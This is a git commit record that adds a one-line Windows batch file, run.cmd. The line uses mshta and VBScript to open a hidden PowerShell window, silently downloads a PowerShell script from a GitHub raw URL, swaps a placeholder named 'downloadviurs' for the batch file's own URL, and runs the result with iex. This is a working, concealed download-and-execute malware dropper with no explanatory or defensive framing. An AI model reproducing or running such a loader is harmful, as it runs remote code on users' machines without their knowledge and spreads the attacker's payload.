7edbff24049324e8dbfa81228e82ea504c9c224f
43a1723 <hai1723notgay@gmail.com>
2024-05-25 11:35:29 +0700

    Create run.cmd

---
+++ run.cmd
@@ -0,0 +1,1 @@
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t -replace 'downloadviurs', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | iex",0))
